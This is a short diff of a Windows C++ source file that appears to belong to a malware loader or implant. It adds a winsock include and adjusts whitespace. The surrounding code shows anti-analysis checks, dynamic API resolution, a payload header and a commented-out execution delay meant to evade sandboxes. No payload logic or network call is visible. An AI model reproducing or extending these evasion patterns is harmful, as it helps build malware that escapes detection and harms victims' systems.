@@ -3,6 +3,7 @@
 #include "utils/headers/antianalysis.h"
 #include "../headers/payload.h"
 #include "utils/headers/Tools.h"
+#include "winsock.h"
 
 #define WIN32_LEAN_AND_MEAN
 //#define TARGET_FUNC	"WriteFile"
@@ -23,6 +24,8 @@ extern "C" {
 }
 #endif
 
+
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	AntiAnalysis hide;
@@ -31,7 +34,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 
 	API::APIResolver &resolver = API::APIResolver::GetInstance(); // Get instance of the API resolver
-
 
 	hide.IsBeingWatched(resolver); // Initial antianalysis check
 	
@@ -42,7 +44,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	auto api	  = resolver.GetAPIAccess();  // retrieve function pointers
 	
 	//hide.DelayExecution(5, resolver);				      // wait 5 minutes before execution
-
 
 	do
 	{
